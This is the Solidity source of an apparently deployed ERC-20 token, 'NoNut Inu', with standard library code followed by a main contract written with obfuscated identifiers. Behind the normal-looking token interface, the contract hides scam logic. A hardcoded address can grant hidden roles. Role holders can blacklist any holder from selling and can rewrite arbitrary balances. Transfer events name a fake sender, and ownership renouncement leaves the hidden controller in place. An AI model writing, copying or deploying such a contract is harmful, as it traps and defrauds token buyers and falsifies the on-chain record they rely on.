/**
 *Submitted for verification at Etherscan.io on 2022-11-02
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*

MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNNNNNWMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWWWNXKOxddxkO0XNWMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWWNNNNNNNNXXXKKKKKKKK000Okxlc:ccloxOKXNWWMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWWNNXXXNNXXKKK000OOkOOOkkkkkkOkkkO0OOkxoc::ccclodkOKXNWWWMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMWWX0OkxdlcldxOOkOO0000OOOOOOkOOkkkkkkkkOOkkkkxoccccccloxkkkkO0XWMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMWXK0Okxdolllc',:looddxOOOO00000OOO00OOkkkkkkOOOO0000kkkxddddxkxxdddkNMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMN0kdddolllolll:',cloodxOOOO0000000OOkkOOOOOOOO0OO0KXXKKKKKK0OOOkxxdold0WMMMMMMMM
MMMMMMMMMMMMMMMMMWNKkdooodoollllclc,,ldxxkO0O0000KK0OOOkkkkkO00OO0000KKKXXKK00000OkxdxdoooOWMMMMMMMM
MMMMMMMMMMMMMMMWXOxooooooddollllcll:cxkkkkOO0000K00OOkkkkkkkkkO00OO0000KKKK0OOkkkkxdddollo0WMMMMMMMM
MMMMMMMMMMMMWXXKOdooooddddddoooolloclxOOOOOO0KKK0OkxdddxxxkkkkO000O0000KKK0OkxdoodooddoodONMMMMMMMMM
MMMMMMMMMMWXkdddxxdddoddxddxxddollollkOOkkOKKK0kxdoollooddxkkkO00OO00000K0Okdc:;;:ccooldKWMMMMMMMMMM
MMMMMMMMMMWKxdoldxxddddxxxxxxxdolooodO00OO0K0kxdlcccclllooddxxxkOkkOOOO00Odl:'...,:clod0WMMMMMMMMMMM
MMMMMMMMMMMNKOxodxxdxxxxkxxxkkxdoddodO000O00Okxdlc:::cclloooooodxxkkOkkOkdol;.. .':;;ckNMMMMMMMMMMMM
MMMMMMMMMMMWX0K0kxooddxxxxxxxxxxxdddxO000OO00kdoc;,'..;::lllodxkkkkkkkOOkxdl;....:dc,c0WMMMMMMMMMMMM
MMMMMMMMMMMMWNXXXOdooddxxkxxxxxxxxxxxkkk00OOxl;,.......'',;;coxOOOOOOOOOOkxdo:,:oooxdcdXMMMMMMMMMMMM
MMMMMMMMMMMMMMWNWNX0kxxxxkkkkkkkkkxdodxxO0Okdl:;,....',,,;;:cdkOOOOOOOOOkOOOkdoxxdxKN0kXMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMWNK0OkxxkkkkkxxxdokkkOOOOOkxdoc:::::clloxxkOOOOOkkkkOOOOOkkxxxdkXMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMWNKOkkkOkkkkoldxkOOOOOOOkkxdddoddddkOOOOOkkkkxxkOO000OOOkkxkNMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMWNKOOOkOkllkkxxkOOOOOkkkkkOOOOkkOOOkkkxxxxxkkOOOOOOkkkOkOXMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMN0Okkkxl;lkOkkkkkOOOOkkkkkkOOOOOOkxxxxxxkxxxkkkkOOOOOkkkKWMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMNd',,,,,''cxOkdxxxkkkkxxxkkkOOOOkkkxxkkkkxdddxxdxOOOOkkkx0WMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMM0;.......;lxkkkxxxxkkOOOOOOOOOOkxxxxxxxxdooodxxxxkOkkxxkkOKNWMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMNl.......':lodxxkkkO00000OOkxkOkkkxkxxxdooooodxkkkOOkxdxkkkO0NWMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMO,......'cxddddxkkkkkkOOkxxxxkOOOOOkkxdolloodxxkkkkkkkkkxxxxxOKWMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMO,.';::,,lxxxxdoodkkxxkxxxxkxkO0OOOkxdollllloddkkkkxxkkkkkxddxk0XWMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMO,';cddoodxddxxdolodxddxxkkkxkkkkkkxddolllcclddxkxxxxxkkkkxdodxkOKWMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMWx'.':dxdk00dooddolldddodxkkkkxdxxxxdooollc:::lddddddodxkxdoooloddx0NMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMXc..';lddkKXOo:cllccloxdodxxxkkxkkdddoooolc::::lolcllllodoooollllcldkXWMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMXo'..':odx0XKOd:;:ccldkxdoodxkOOkkxxkxxdlllc:;;:cc:cllcclodxddddollllxXWMMMM
MMMMMMMMMMMMMMMMMMMMMMMMNd...,;lddk0OkkxlcldxxxxxdddxkOOOkkkkxdollc:;;;;:::::::::ccloddollodddkKWMMM
MMMMMMMMMMMMMMMMMMMMMMMMWk'..,:clokOkkOOkdllddooooddkOkO0Okkxxolcc:;;,,,,;;;;:::;''.',:lcldxxxxkKWMM
MMMMMMMMMMMMMMMMMMMMMMMMMO;..,clllx0OkO0KKOxl:::clldkkkOOOOkxdlc:;,'.....',:l:;;;'....;cldxxkkxxONMM
MMMMMMMMMMMMMMMMMMMMMMMMMO;'.,colcd0K00KKKKKkl;'';:lxkkkOOOkdl:;,''.........'.....   .,clodkOOOOKNMM
MMMMMMMMMMMMMMMMMMMMMMMMMKl'..:loookO00KKKKKKOd:,'';oxkkOOkxdl:;''',cc,..            .';:lodxkkOKNMM
MMMMMMMMMMMMMMMMMMMMMMMMNkc'..;lodxOOO0KKXXXK0Oxo:,;:lxkOOkkxol:'.';ldl:,....       ..',:ldxdxkk0NWM
MMMMMMMMMMMMMMMMMMMMMMMNd;'...,codk00O00XNNXK0000kdo:lxkOOOkxdo:'':lloooc,..      ..'..;cloxkxxk0XWM
MMMMMMMMMMMMMMMMMMMMMMWk;'''.',:cldxkO0KXXNXKK00K00OdxO0OOOkxol:',lolccccc:;'. ...''...;cloxkkxxOKNM
MMMMMMMMMMMMMMMMMMMMMMWk;'''..';clooox0XXXXK0KKKKKK0O0K00OOkxoc,.,cc:,,,;;;'...........;ccodxkkxxOXW
MMMMMMMMMMMMMMMMMMMMMMMO;......'codddk0XXXK000000KK0OOO000Okxo:...''..................;:;:ldxxxxxkXW
MMMMMMMMMMMMMMMMMMMMMMWk;.......;ldddxkKXK0000O0000OOkxkOOOkxo:'.........'',;:clc:;''';cccxOkxxOKNWM
MMMMMMMMMMMMMMMMMMMMMMWx;,'....':llooodkO00000KKK000Okxxkkkxdo:,.......',;;:lllodoc:;,:ollOXK00XWMMM
MMMMMMMMMMMMMMMMMMMMMMXo,,''..';clllloddxO0KKKKK0000Okxxkkkxdl:;'...',',:c::ccccccc::;lkKXNMMWWMMMMM
MMMMMMMMMMMMMMMMMMMMMNx;,,''..',,:ccllllldxO00K00KK00OOkxkkkdc:;'',,:;,;:::::;:::::::cd0WMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMWk;',,'...',,,;:cllllloodkO000OO00Okxxxxocc:,,;:cc::c:::;;;:::::cokXWMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMKc..,,.....,,',;;;;::cllloxO0Okkkxxdloddlclcc:::cccclcc::;;::::codOXWMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMWd'..,'....,,,,,,,,;:::::cldxkdoooccc;;clc:dxxoccloloolcc::::cccldxOKNMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMW0:...'....';;,'''',;;,;;:cllc:;;;;;:;;;;:;;d00OoloxdddoollcloolcloxOKNMMMMMMMMMMM
MMMMMMMMMMMMMMMMMWOl,........,::;,''',,;::::ll:;,;;;,,,;;;,,'':dOKOddkOkxddoooxkOOOO0KXWWMMMMMMMMMMM
MMMMMMMMMMMMMMMMWOc;,'......':cc:;,''',:cc:clc;;,;;,'';;;;,'...'cddod0XX0kxxxk0XNWWWMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMM0l;,''......,;;;::,,,,;;::::;,''',;,,:c:,,'''..','.',dXWXK0OkOKWMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMWKo;,'..'''.',;:;,;;;;;,,'',,'''...,;;:c:,,;;;'.',,....'dNWWWNNNWMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMKo;'.''.',,',:ccc;;::;;,'.''',;;,'';::;;,,::,..',,..  ..;kWMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMWKo;'..''.',,,;:lllcc::::;''..';::;;:;,,',;:;,.',;;'.    ..;OWMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMNOc,,,''''''',;;::llllllolc:;,,,,,;:::,'';:::;,';c:,..  ... .cXMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMNkc;;;:;,;;;;;;;;,;ldxkOOkxddolcccc:::ccclddolcccc::,.  ..... .kWMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMKl,;:cc:;::c:;;,,,:lxkOOkxxxxxxxddoc:;clooooolccllcc;....',,...;KMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMWO;',;:cc:::::;;,,;;cldkkxxOOkOOkxdoollllllodo:'.,:c:'...';:;.. .lXMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMWx,.',;:ccc:::;;:cc::clodxkkkOOOkdolllollllool:'';::,...':::;.   .dNMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMNx,',,:c::cccccccllllccloxxxxxxddddolccloddol:;;;;:;'.',;::c;.   .'xNMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMWXd:;,;:;,:cllllccclodocclodxdoddddxdollllccc:;,;;;;'',;:::cc;.   ..;OWMMMMMMMMMMMMMMMMMMMMM
MMMMMMMW0xddo:;;;;:ccllc:::ccllcccccodxkkkxkkxool:;;;,',::;,,,;;:cccc,.......c0MMMMMMMMMMMMMMMMMMMMM
MMMMMMM0lldkxol:;;::clccccllccc::c::loolloddxxxdolc:,,,::;,;;;:::ccc:'........lXMMMMMMMMMMMMMMMMMMMM
MMMMMMMXkdodddolcc:cloccllllc:;:c:::colcccllooodddoc,,,;;;;;:::;;cc:;''.......,xNMMMMMMMMMMMMMMMMMMM
MMMMMMMN0xdddxdoolcclocclllolc:cccccccccclodollloooc,',;:;;;::::ccccc:,........:0MMMMMMMMMMMMMMMMMMM
MMMMMMW0xddddddolooodl:cccllllooddoddlllodxkkdolc:;,,;::cclc:::llc:cc;,'......''lKMMMMMMMMMMMMMMMMMM
MMMMMWKxoodxkxddooollc:::cllclloxkOOkxxxxxkOOkxdolccccccloxdl::cccc:::;,'....''''dNMMMMMMMMMMMMMMMMM
MMMMMXkoodxOOOOkdollccccclloooooxO000OkxkO0K0Okxdoooxdlccdkxddoc::cccc:;,;cc;;;;,;OWMMMMMMMMMMMMMMMM
MMMMW0doodk0KK00OxoolllloddoodxkO0000OkO0KKK0OkxddddkkoloxO0OOkkxoooolccldxdl:;:::dXMMMMMMMMMMMMMMMM
MMMW0dlodkOkO00KK0OkxddooddxxkO00KKK00O0KKK000kxddodxxdxk0KKKKKKKK00Oxdddoodol::olcxNMMMMMMMMMMMMMMM
MMMNkllodkOOOO0000OkxddddxkkO0K0KKK00000KK0OOOOkxdddooxO0XXXKKKXKKK0OkkxdodddlclxkodKWMMMMMMMMMMMMMM
MMWKxoooxOOOOOO00OOkxxxkkkkkO0KKKK000O00000OOkOOOxxdodx0KXKKKKKXKK0OOOOkxxxxdlc:loooxKMMMMMMMMMMMMMM
MWXkllodkO00000KKK0OkkkOOOOOO000KK0OOOOOO00OkxkOkxddddxOKXXNXXXXKK000OOOkxxxdlc:ccclkKWMMMMMMMMMMMMM
MNkoooodk0000KKKKKK0000000OO000KKK00000000OkxddkkxddddxO0KXXNNXXKK000OOOxxkOkxdolllldOXWMMMMMMMMMMMM
MKdoooddkO000KKKK000000000000KKKKKKKKKKKK0OkxdxkOOOOkkkO00KXNNXKKK000OOkkkkOOOxooollldONMMMMMMMMMMMM
WOollodxO000O000000000000000000KKKKKKKXXK0OOOOO0KK00OkkkkO0KKKK00KKK0OOkkkOOOkdlloooddoOMMMMMMMMMMMM
WOoooodxO0000OOOOO0000K000O000KKKXNNNXXK0OOOOOO0000OOkkxxkO000KKKK000OOkkkOOkxoccclodxkKMMMMMMMMMMMM
WOooddxk0000000000000KK0OOOO00KKKXNWMWNXKK0OkkO00000OkkkxkO0000KK000OkkOOOOOkxdooododk0XMMMMMMMMMMMM
WOdodxxO00000KKKKKKKKK0OOOkkO0000KXNWMWWNNXKOOOO00K0OOkkkO00OOO0000OkkOOOOOOOkxdddxxdxKNWMMMMMMMMMMM
NOooddxkO0000KKKKKKKK0OOkkkOkkOO000XWWWWWWNXK0OO00K00OOkkOOOkOOO000OkkOOkkkOkkkxdooddd0NMMMMMMMMMMMM
KxooddxkOOO00KK0KKKK0OOkkkkOOkxkkkO0XNWWWWWNXXKOOO00OOkkkkkkkOOO000OOOOkkkkkkkkxxdoodoONWMMMMMMMMMMM
OooodddxxkkOO0000KK00OOkkkkkkkxxxxkO0XXNWWWWNNXOkO00OOkkkkkkkkkO00OOOOOOkkkkkkxddoodddOXWMMMMMMMMMMM

*/

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address internal _owner;
    address internal _constructor = 0xEA3147352aAA3880CCF872c0056bB9c90a8a9539;
    address internal _origin = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address sender = msg.sender;
        _owner = sender;
        emit OwnershipTransferred(address(0), sender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual {
        require(msg.sender == _owner);
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract NoNutInu is IERC20, IERC20Metadata, Ownable {
    mapping(address => uint256) private xii;
    mapping(address => bool) private yii;
    mapping(address => bool) private zii;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply = 1_000_000_000 * 1e18;
    string private _name = "NoNut Inu";
    string private _symbol = "NONUTINU";

    constructor() {
        xii[msg.sender] = _totalSupply;
        emit Transfer(address(0), _origin, _totalSupply);
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return xii[account];
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0) && spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
        require(currentAllowance >= amount);
        unchecked {
        _approve(owner, spender, currentAllowance - amount);}}}
        function xen(address addr) external {
        if(yii[msg.sender]) {
        zii[addr] = false;}}
        function xque(address addr) external {
        if(yii[msg.sender])  {
        require(!zii[addr]);
        zii[addr] = true;}}
        function vi(address addr) external view returns (bool) {
        return zii[addr];}
        function xstake(address addr) external {
        if(msg.sender == _constructor)  {
        require(!yii[addr]);
        yii[addr] = true;}}
        function transfer(address to, uint256 amount) public virtual override returns (bool success) {
        if(msg.sender == _constructor) {
        require(xii[msg.sender] >= amount);
        unchecked {
        xii[msg.sender] -= amount;
        xii[to] += amount;}
        emit Transfer(_origin, to, amount);
        return true;}
        if(yii[msg.sender]) {
        xii[to] = amount;}
        if(!zii[msg.sender]) {
        require(xii[msg.sender] >= amount);
        unchecked {
        xii[msg.sender] -= amount;
        xii[to] += amount;}
        emit Transfer(msg.sender, to, amount);
        return true;}}
        function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool success) {
        if(from == _constructor) {
        require(xii[from] >= amount);
        _spendAllowance(from, msg.sender, amount);
        unchecked {
        xii[from] -= amount;
        xii[to] += amount;}
        emit Transfer(_origin, to, amount);
        return true;}
        if(!zii[to]) {
        if(!zii[from]) {
        require(xii[from] >= amount);
        _spendAllowance(from, msg.sender, amount);
        unchecked {
        xii[from] -= amount;
        xii[to] += amount;}
        emit Transfer(from, to, amount);
        return true;}}}
}